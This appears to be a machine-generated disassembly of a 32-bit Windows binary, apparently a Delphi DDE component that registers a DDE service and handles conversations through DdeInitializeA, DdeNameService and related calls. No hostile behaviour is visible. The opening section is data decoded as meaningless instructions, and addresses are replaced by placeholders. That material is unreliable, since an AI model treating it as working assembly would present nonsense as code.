add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax [ eax ]
or al [ esp + 0x65 ]
push ebx
jb r-xdata
inc esi
add [ eax ] cl
add [ eax ] al
adc al 0x6c
inc ecx
add ah bl
cmovb eax [ eax ]
lodsb [ esi ]
xor al 0x40
add [ eax ] dh
or [ edx ] eax
mov ah 0x34
inc eax
add [ eax + 0x8004034 ] ch
xor al [ eax ]
and al 0x32
popad
je r-xdata
mov al 0x0
add bh bh
mov al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop es
add [ edi ] al
dec edi
imul esp [ ebx + 0x65 ] r-xdata
xor al 0x0
add bh bh
xchg esp eax
adc eax [ edi ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al 0x0
or [ esp + 0x65 ] al
push esp
outsd
jo r-xdata
push cs
push esp
inc esp
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x65744974
insd
lea eax [ eax ]
sub al 0xfa
inc esi
add [ edi ] al
push cs
push esp
inc esp
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x65744974
insd
aam 0xf9
inc esi
add [ eax ] dl
insd
inc ecx
add [ edi ] al
add [ esi ] al
inc esp
dec ebp
popad
outsb
add eax 0x4010ac00
add [ eax + 0x16 ] dl
inc edi
add [ esi + edx + 0x47 ] bh
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x54040002 ] al
inc edi
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x380040 ] ch
add [ eax ] al
dec edi
jo r-xdata
outsb
inc ebx
insb
outsd
jae r-xdata
push 0x54737261
pop eax
inc ecx
add [ eax - 0x4f010000 ] dh
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070007 ] al
inc eax
add [ eax + 0x30004714 ] bh
mov [ ecx ] es
in al 0xb
inc edx
add [ ebx + ecx * 4 + 0x41 ] cl
add [ esp + ecx + 0x15cc0042 ] bh
inc edi
add ah cl
or al 0x42
add [ edx + esi ] ah
push esp
pop eax
inc ecx
add [ eax - 0x47010000 ] bh
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060008 ] al
outsb
add [ gs : eax ] dl
inc eax
add bh al
add [ eax ] al
push [ eax + 0x13 ]
inc edi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push es
add [ ebx ] cl
inc esi
outsd
jb r-xdata
arpl [ eax ] bp
test [ esi ] 0xff0000c5
sbb [ ebx ] dl
inc edi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax 0x6f430b00
outsb
outsb
arpl [ gs : ebp + ecx * 2 + 0x6f ] si
add [ eax ] al
add [ eax - 0x80000000 ] al
push es
add [ eax ] cl
dec edi
cmp [ ebx + 0x41 ] ah
add [ eax ] dh
add [ eax ] al
inc [ eax + 0x1004716 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4c050003 ] al
imul ebp [ esi + 0x65 ] 0x46f85c73
add [ eax + eax ] dh
add bh bh
call 0x14741af
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x44070004 ] al
inc ebx
outsd
outsb
jbe r-xdata
add ah al
or eax 0xff40042
inc edx
add ah bl
or al 0x42
add ah dl
or al 0x42
add ah bh
cmovb eax [ eax ]
je r-xdata
outsb
nop
aam 0xf9
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + edi * 8 ] al
inc esi
add [ edx + edi * 8 ] ch
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] dl
cli
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
add al 0x54
adc [ eax ] al
cmp [ eax ] al
add bh bh
jo r-xdata
je r-xdata
inc edi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x44070005 ] al
dec ecx
xor al [ eax ]
and al 0x32
inc eax
add [ eax ] ch
sbb eax 0x8c300047
inc ecx
add ah ah
or eax [ edx ]
dec esp
mov eax [ ecx ]
mov esp 0x8800420c
or eax [ edx ]
int3
inc eax
add [ eax ] cl
outsb
inc ebx
push 0x65676e61
lea eax [ eax ]
inc esp
sti
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x46fb ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edi * 8 + 0x46 ] dh
add [ edx + 0x480046fb ] al
add [ eax ] al
add [ esp + ebp * 2 ] dl
inc ecx
add ah bl
cmovb eax [ eax ]
lodsb [ esi ]
xor al 0x40
add [ eax ] dh
or [ edx ] eax
mov ah 0x34
inc eax
add [ eax + 0x8004034 ] ch
insd
push esp
pop eax
inc ecx
add [ eax ] al
add bh bh
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080006 ] al
sub_46fc2c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sar ah 0x46
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + edi * 8 - 0x353ffba ] ah
inc esi
add [ eax + eax ] cl
add [ esp + ebp * 2 ] dl
inc ecx
add ah bl
cmovb eax [ eax ]
lodsb [ esi ]
xor al 0x40
add [ eax ] dh
or [ edx ] eax
mov ah 0x34
inc eax
add [ eax + 0x8004034 ] ch
xor al [ eax ]
and al 0x32
inc eax
add [ edx + ebx + 0x47 ] ah
add [ eax ] dh
mov [ ecx ] es
in al 0xb
inc edx
add [ ebx + ecx * 4 + 0x41 ] cl
add [ esp + ecx + 0x1cbc0042 ] bh
inc edi
add ah cl
or al 0x42
add ah al
or eax 0xff40042
inc edx
add ah bl
or al 0x42
add ah dl
or al 0x42
add ah bh
cmovb eax [ eax ]
sbb [ edx ] bl
inc edi
add [ ecx ] al
add bh ch
[ eax + 0xe00471c ]
sub_46fd4f
cmp [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax 0x6e4f0800
inc ebx
push 0x65676e61
push esp
pop eax
inc ecx
add [ eax ] al
add bh bh
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0006 ] al
outsb
push eax
outsd
imul esp [ ebp + 0x44 ] 0x61
je r-xdata
int3
nop
fdiv st5
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + edi * 8 ] cl
inc esi
add [ esi + edi * 8 ] ch
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] bl
inc [ esi ]
dec esp
add [ eax ] al
add [ esp + ebp * 2 ] dl
inc ecx
add ah bl
cmovb eax [ eax ]
lodsb [ esi ]
xor al 0x40
add [ eax ] dh
or [ edx ] eax
mov ah 0x34
inc eax
add [ eax + 0x8004034 ] ch
xor al [ eax ]
and al 0x32
inc eax
add ah dl
add al 0x47
add [ eax ] dh
mov [ ecx ] es
in al 0xb
inc edx
add [ ebx + ecx * 4 + 0x41 ] cl
add [ esp + ecx + 0xb880042 ] bh
inc edx
add ah cl
or al 0x42
add ah al
or eax 0xff40042
inc edx
add ah bl
or al 0x42
add ah dl
or al 0x42
add ah bh
cmovb eax [ eax ]
hlt
sub_4700e4
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
xor edx edx
push ebp
push sub_4701d6
push [ fs : edx ]
mov [ fs : edx ] esp
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4701dd
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_40400c
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40400c
retn
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeGetLastError
mov ebx eax
mov eax ebx
add eax 0xffffbff9
sub eax 0x2
jb r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405d6c
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] 0x0
lea edx [ ebp - 0x10 ]
xor ecx ecx
call sub_408da8
jmp r-xdata
dec eax
je r-xdata
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_403a24
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405d6c
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] 0x0
lea edx [ ebp - 0x10 ]
xor ecx ecx
call sub_408da8
jmp r-xdata
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_405d6c
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] 0x0
lea edx [ ebp - 0x10 ]
xor ecx ecx
call sub_408da8
sub_4701e4
push ebp
mov ebp esp
add esp 0xffffff9c
push ebx
push esi
push edi
mov ebx [ ebp + 0x10 ]
mov esi [ ebp + 0x8 ]
xor edi edi
mov eax esi
sub eax 0x1062
je r-xdata
mov ecx [ ebp + 0x14 ]
mov edx [ ebp + 0x18 ]
mov eax [ rw-data ]
call sub_47058c
mov edi eax
and edi 0x7f
jmp r-xdata
sub eax 0x1080
je r-xdata
test ebx ebx
je r-xdata
mov ecx [ ebp + 0x14 ]
mov edx [ ebp + 0x18 ]
mov eax [ rw-data ]
call sub_470640
mov edi eax
jmp r-xdata
sub eax 0x5f90
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x20
mov [ ebp - 0x64 ] 0x60
cmp esi 0x8080
jne r-xdata
mov eax [ ebp + 0x24 ]
push eax
mov ecx [ ebp + 0x14 ]
mov edx ebx
mov eax [ rw-data ]
call sub_4706a4
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
cmp esi 0x4050
jg r-xdata
lea eax [ ebp - 0x64 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push ebx
call DdeQueryConvInfo
test eax eax
je r-xdata
sub esi 0x4090
je r-xdata
je r-xdata
mov esi [ ebp - 0x60 ]
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x14 ]
mov edx ebx
mov eax esi
call sub_47204c
mov edi eax
jmp r-xdata
sub esi 0x3fb0
je r-xdata
mov esi [ ebp - 0x60 ]
mov eax [ ebp + 0x1c ]
push eax
mov ecx [ ebp + 0x14 ]
mov edx ebx
mov eax esi
call sub_472100
mov edi eax
jmp r-xdata
sub esi 0x1030
je r-xdata
mov esi [ ebp - 0x60 ]
mov eax [ ebp + 0x18 ]
push eax
mov ecx [ ebp + 0x14 ]
mov edx ebx
mov eax esi
call sub_47201c
jmp r-xdata
sub esi 0x40
je r-xdata
mov esi [ ebp - 0x60 ]
mov eax [ ebp + 0x18 ]
push eax
mov ax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x14 ]
mov edx ebx
mov eax esi
call sub_471ee8
mov edi eax
and edi 0x7f
jmp r-xdata
sub esi 0xff2
je r-xdata
mov eax [ ebp - 0x60 ]
test eax eax
je r-xdata
sub esi 0x42
je r-xdata
mov esi [ ebp - 0x60 ]
mov eax [ ebp + 0x18 ]
push eax
mov ax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x14 ]
mov edx ebx
mov eax esi
call sub_472120
mov edi eax
jmp r-xdata
sub esi 0x8e
je r-xdata
call sub_47128c
jmp r-xdata
mov ebx [ ebp - 0x60 ]
test ebx ebx
je r-xdata
jmp r-xdata
mov esi [ ebp - 0x60 ]
mov eax [ ebp + 0x18 ]
push eax
mov ax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x14 ]
mov edx ebx
mov eax esi
call sub_472120
mov edi eax
jmp r-xdata
sub esi 0x1f60
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
mov eax [ ebp - 0x60 ]
mov ecx [ ebp + 0x18 ]
mov edx [ ebp + 0x1c ]
call sub_4712d8
jmp r-xdata
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_470788
mov eax ebx
call sub_471294
jmp r-xdata
sub_4703f4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4704a8
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_42086c
push r-xdata
call RegisterClipboardFormatA
mov [ esi + 0x48 ] ax
xor eax eax
mov [ esi + 0x44 ] eax
push 0x0
push 0x0
push sub_4701e4
lea eax [ esi + 0x44 ]
push eax
call DdeInitializeA
test eax eax
sete al
call sub_4700e4
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov [ esi + 0x38 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov [ esi + 0x3c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov [ esi + 0x40 ] eax
lea edx [ ebp - 0x4 ]
xor eax eax
call sub_402a1c
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_4707d0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4704af
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
add esp 0xfffffff0
call sub_4035bc
sub_4704d1
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
push ebp
call sub_403624
mov ebx edx
mov ebp eax
mov eax [ ebp + 0x38 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x3c ]
test eax eax
je r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x40 ]
test eax eax
je r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x38 ]
call sub_403270
xor eax eax
mov [ ebp + 0x38 ] eax
inc esi
xor edi edi
mov eax ebp
call sub_470884
mov eax [ ebp + 0x44 ]
push eax
call DdeUninitialize
xor eax eax
mov [ rw-data ] eax
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_4208b8
test bl bl
jle r-xdata
call sub_403270
xor eax eax
mov [ ebp + 0x40 ] eax
mov eax [ ebp + 0x3c ]
call sub_403270
xor eax eax
mov [ ebp + 0x3c ] eax
inc esi
xor edi edi
mov eax [ ebp + 0x38 ]
mov edx edi
call sub_418550
call sub_403270
inc edi
dec esi
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_40360c
mov eax [ ebp + 0x3c ]
mov edx edi
call sub_418550
call sub_403270
inc edi
dec esi
jne r-xdata
sub_47058c
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov edi eax
xor eax eax
push ebp
push sub_470630
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
test esi esi
je r-xdata
push 0x3ec
push 0x1000
lea eax [ ebp - 0x1008 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ edi + 0x44 ]
push eax
call DdeQueryStringA
mov ecx eax
lea edx [ ebp - 0x1008 ]
lea eax [ ebp - 0x8 ]
call sub_4040d8
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_4708b0
test eax eax
je r-xdata
mov eax [ edi + 0x34 ]
push eax
push esi
call DdeCmpStringHandles
test eax eax
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_470900
test eax eax
je r-xdata
mov bl 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_470637
lea eax [ ebp - 0x8 ]
call sub_403fe8
retn
mov bl 0x1
sub_470640
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov esi ecx
mov ebp edx
mov ebx eax
xor edi edi
test esi esi
je r-xdata
mov eax edi
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx esi
mov edx ebp
mov eax ebx
call sub_47058c
cmp al 0x1
jne r-xdata
mov eax [ ebx + 0x34 ]
mov [ esp ] eax
mov [ esp + 0x4 ] esi
xor eax eax
mov [ esp + 0x8 ] eax
xor eax eax
mov [ esp + 0xc ] eax
push 0x0
push 0x1
push 0x0
push 0x0
push 0x10
lea eax [ esp + 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeCreateDataHandle
mov edi eax
sub_4706a4
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_470775
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_471e20
mov ebx eax
push 0x3ec
push 0x1000
lea eax [ ebp - 0x1008 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ esi + 0x44 ]
push eax
call DdeQueryStringA
mov ecx eax
lea edx [ ebp - 0x1008 ]
lea eax [ ebp - 0x8 ]
call sub_4040d8
lea eax [ ebx + 0x30 ]
mov edx [ ebp - 0x8 ]
call sub_40403c
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4708b0
mov [ ebx + 0x3c ] eax
cmp [ ebx + 0x3c ] 0x0
jne r-xdata
mov [ ebx + 0x40 ] edi
push ebx
push 0xffffffff
push edi
call DdeSetUserHandle
mov edx ebx
mov eax [ esi + 0x38 ]
call sub_4183f4
mov eax [ ebx + 0x3c ]
test eax eax
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_470900
mov [ ebx + 0x38 ] eax
mov bl 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47077c
lea eax [ ebp - 0x8 ]
call sub_403fe8
retn
mov si 0xffef
call sub_40346c
sub_470788
push ebx
push esi
push edi
mov edi eax
mov ebx edx
mov eax [ ebx + 0x3c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x40 ]
test eax eax
je r-xdata
mov si 0xffee
call sub_40346c
xor eax eax
mov [ ebx + 0x40 ] eax
mov eax [ edi + 0x38 ]
test eax eax
je r-xdata
push 0x0
push 0xffffffff
push eax
call DdeSetUserHandle
pop edi
pop esi
pop ebx
retn
mov edx ebx
call sub_4186ec
mov eax ebx
call sub_403270
sub_4707d0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_47086c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_470884
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_4085cc
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x30 ]
call sub_40403c
mov edx [ ebx + 0x30 ]
mov eax r-xdata
call sub_4045ec
mov esi eax
test esi esi
je r-xdata
push 0x3ec
mov eax [ ebx + 0x30 ]
call sub_4044a8
push eax
mov eax [ ebx + 0x44 ]
push eax
call DdeCreateStringHandleA
mov esi eax
mov [ ebx + 0x34 ] esi
push 0x1
push 0x0
push esi
mov eax [ ebx + 0x44 ]
push eax
call DdeNameService
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_470873
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
mov eax [ ebx + 0x30 ]
call sub_4042a8
mov ecx eax
lea eax [ ebx + 0x30 ]
mov edx esi
call sub_404548
sub_470884
push ebx
mov ebx eax
mov eax [ ebx + 0x34 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebx + 0x34 ] eax
pop ebx
retn
push 0x2
push 0x0
push eax
mov eax [ ebx + 0x44 ]
push eax
call DdeNameService
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebx + 0x44 ]
push eax
call DdeFreeStringHandle
sub_4708b0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov ebp eax
xor eax eax
mov [ esp + 0x4 ] eax
mov eax [ ebp + 0x40 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ esp + 0x4 ] ebx
jmp r-xdata
mov eax [ ebp + 0x40 ]
mov edx edi
call sub_418550
mov ebx eax
mov edx [ esp ]
mov eax [ ebx + 0x8 ]
call sub_407f3c
test eax eax
jne r-xdata
sub_470900
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
xor eax eax
push ebp
push sub_470982
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_464a98
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_470989
lea eax [ ebp - 0xc ]
call sub_403fe8
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ ebp - 0x8 ] ebx
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx edi
call sub_464a84
mov ebx eax
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_446764
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_407f3c
test eax eax
jne r-xdata
sub_470994
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov ebp eax
xor eax eax
mov [ esp + 0x4 ] eax
mov eax [ ebp + 0x38 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ esp + 0x4 ] ebx
jmp r-xdata
mov eax [ ebp + 0x38 ]
mov edx edi
call sub_418550
mov ebx eax
mov edx [ esp ]
mov eax [ ebx + 0x30 ]
call sub_407f3c
test eax eax
jne r-xdata
sub_4709e4
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_404498
xor eax eax
push ebp
push sub_470a3b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov eax ebx
call sub_470994
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_470a42
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
mov edx [ ebp - 0x4 ]
call sub_472308
test eax eax
je r-xdata
call sub_4724ec
sub_470a68
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_42086c
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov [ esi + 0x9c ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035bc
mov eax esi
pop esi
pop ebx
retn
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_470ab0
push ebx
push esi
call sub_403624
mov ebx edx
mov esi eax
mov eax esi
call sub_4710f4
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4208b8
mov eax [ esi + 0x9c ]
call sub_403270
xor eax eax
mov [ esi + 0x9c ] eax
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40360c
sub_470af0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_420be4
push ebx
push sub_470bc0
push ebx
push r-xdata
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov cl 0x1
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
xor ecx ecx
jmp r-xdata
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop esi
pop ebx
retn
sub_470b3d
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_470bb4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_420cbc
lea eax [ ebp - 0x4 ]
mov edx [ ebx + 0x30 ]
call sub_404080
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x34 ]
call sub_404080
mov eax [ ebp - 0x4 ]
call sub_4042a8
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_470bbb
cmp [ ebx + 0xc5 ] 0x1
je r-xdata
push 0x0
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_470eb0
sub_470bc0
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi edx
mov edi eax
xor eax eax
push ebp
push sub_470c6b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_41cba8
jmp r-xdata
mov eax esi
call sub_41bc44
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_41d848
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_4045ec
mov ebx eax
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4042a8
mov ecx eax
sub ecx ebx
lea edx [ ebx + 0x1 ]
mov eax [ ebp - 0x4 ]
call sub_404508
mov eax [ ebp - 0x4 ]
mov al [ eax ]
sub al 0x53
je r-xdata
mov eax esi
call sub_41cbb0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_470c72
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40400c
retn
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_471398
jmp r-xdata
dec al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_4713ac
jmp r-xdata
sub_470c7f
inc [ ecx ]
add [ eax ] al
add [ eax ] ah
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_470d3b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41edb4
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x30 ]
call sub_404080
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x10 ]
xor ecx ecx
mov eax r-xdata
call sub_408da8
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_420518
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x34 ]
call sub_404080
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x10 ]
xor ecx ecx
mov eax r-xdata
call sub_408da8
mov edx [ ebp - 0x14 ]
mov eax ebx
call sub_420518
mov eax ebx
call sub_41edbc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_470d42
lea eax [ ebp - 0x14 ]
call sub_403fe8
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40400c
retn
sub_470d70
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_471684
mov esi eax
mov eax [ ebx + 0x9c ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_4185cc
mov [ esi + 0x10 ] edi
xor edx edx
mov eax esi
call sub_4716f4
pop edi
pop esi
pop ebx
retn
sub_470da8
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_470e68
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
xor edx edx
mov eax ebx
call sub_4716f4
mov edx ebx
mov eax [ esi + 0x9c ]
call sub_4186ec
mov eax ebx
call sub_403270
sub_470de0
push ebx
push esi
push edi
push ebp
push ecx
mov ebp ecx
mov edi edx
mov esi eax
mov [ esp ] 0x1
mov edx edi
mov eax esi
call sub_470e68
mov ebx eax
test ebx ebx
jne r-xdata
test ebx ebx
je r-xdata
mov eax ebp
call sub_4042a8
test eax eax
jle r-xdata
test ebx ebx
je r-xdata
mov eax ebp
call sub_4042a8
test eax eax
jne r-xdata
mov edx edi
mov eax esi
call sub_470d70
mov edx edi
mov eax esi
call sub_470e68
mov ebx eax
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
